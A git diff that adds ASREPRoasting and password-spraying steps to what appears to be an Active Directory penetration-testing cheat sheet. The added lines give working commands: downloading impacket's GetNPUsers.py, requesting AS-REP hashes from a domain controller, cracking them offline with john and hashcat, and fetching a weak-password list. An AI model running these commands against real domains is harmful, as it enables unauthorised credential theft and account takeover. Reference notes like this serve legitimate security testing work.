@@ -103,6 +103,27 @@ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/
 nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='ad.domain',userdb=/home/tester/names.txt <DC-IP>
 ```
 
+ASREPRoasting:
+
+*The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH). Anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password.*
+
+```
+Original work: https://github.com/HarmJ0y/ASREPRoast
+wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/3c6713e309cae871d685fa443d3e21b7026a2155/examples/GetNPUsers.py
+python3 GetNPUsers.py -usersfile validNames.txt -dc-ip <DC-IP> -format hashcat -outputfile hashes.asreproast ad.domain/ | tee asreproast.out
+if DONT_REQ_PREAUTH:
+cat asreproast.out | grep -v "doesn't have"
+then offline cracking:
+john --wordlist=passwords_kerb.txt hashes.asreproast
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+```
+
+Password spraying:
+
+```
+wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
+```
+
 ### Exploring AD: authenticated (unprivileged) user
 
 ### Exploring AD: Domain Admin
